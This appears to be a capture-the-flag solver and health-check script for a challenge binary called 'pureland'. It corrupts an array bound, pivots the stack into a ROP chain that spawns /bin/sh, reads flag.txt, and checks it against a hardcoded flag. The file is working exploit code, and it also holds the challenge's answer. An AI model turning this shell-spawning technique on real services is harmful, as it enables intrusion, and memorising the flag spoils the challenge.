#!/usr/bin/env python3

from pwn import context, remote, ELF, u64, logging
from struct import pack
from pathlib import Path
import argparse


logging.disable()


def main(hostname, port):
    elf = Path(__file__).parent.parent / "dist" / "pureland"
    context.binary = exe = ELF(str(elf))

    crashes = [460, 461, 462, 463, 464, 574, 577, 578, 580,
            581, 588, 589, 593, 594, 595, 596, 597, 598, 599]

    io = remote(hostname, port)

    # corrupt array size
    io.recvuntil(b'choice:\n')
    io.sendline(b'1')
    io.sendline(b'0')
    io.sendline(b'1000000')

    io.recvuntil(b'choice:\n')
    io.sendline(b'3')


    def send_word(pos, value):
        io.recvuntil(b'choice:\n')
        io.sendline(b'1')
        io.sendline(str(pos).encode())
        io.sendline(str(value).encode())


    pop_rsp_ret = 0x0000000000403a07
    leave_ret = 0x00000000004b51ff


    def p(x): return pack('Q', x)


    # 542838146c1b3619190fd524fd3bb3e9981393192a2f9bfa67261a5953a54305
    IMAGE_BASE_0 = 0x0000000000400000
    def rebase_0(x): return p(x + IMAGE_BASE_0)


    rop = b''

    rop += rebase_0(0x000000000001c331)  # 0x000000000041c331: pop rax; ret;
    rop += b'//bin/sh'
    rop += rebase_0(0x0000000000004f77)  # 0x0000000000404f77: pop rdi; ret;
    rop += rebase_0(0x00000000000e3360)
    # 0x000000000048c946: mov qword ptr [rdi], rax; ret;
    rop += rebase_0(0x000000000008c946)
    rop += rebase_0(0x000000000001c331)  # 0x000000000041c331: pop rax; ret;
    rop += p(0x0000000000000000)
    rop += rebase_0(0x0000000000004f77)  # 0x0000000000404f77: pop rdi; ret;
    rop += rebase_0(0x00000000000e3368)
    # 0x000000000048c946: mov qword ptr [rdi], rax; ret;
    rop += rebase_0(0x000000000008c946)
    # Filled registers: rdi, rsi, rax,
    rop += rebase_0(0x0000000000004f77)  # 0x0000000000404f77: pop rdi; ret;
    rop += rebase_0(0x00000000000e3360)
    rop += rebase_0(0x00000000000045de)  # 0x00000000004045de: pop rsi; ret;
    rop += rebase_0(0x00000000000e3368)
    rop += rebase_0(0x000000000001c331)  # 0x000000000041c331: pop rax; ret;
    rop += p(0x000000000000003b)
    rop += rebase_0(0x000000000004b977)  # 0x000000000044b977: syscall;


    send_word(crashes[5], leave_ret)
    send_word(crashes[5]+1, pop_rsp_ret)
    send_word(crashes[5]+2, 0x4200404178)
    for i in range(0, len(rop), 8):
        send_word(i//8, u64(rop[i:i+8]))

    io.recvuntil(b'choice:\n')
    io.sendline(b'4')  # exit the program

    io.sendline(b'cat flag.txt && exit')
    output = io.recvall()

    flag = output.split(b'\n')[-1].strip().decode()

    if flag == 'ifctf{A_m0nad_is_a_m0n0id_in_th3_c4teg0ry_of_3nd0funct0rs_wh4t_1s_th3_pr0bl3m?}':
        print('OK - successfully read flag from remote service')
        exit(0)
    else:
        print('ERROR - could not retrieve flag')
        exit(1)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('--hostname')
    parser.add_argument('--port')
    args = parser.parse_args()

    hostname = args.hostname or 'localhost'
    port = int(args.port) if args.port is not None else 10001

    main(hostname, port)
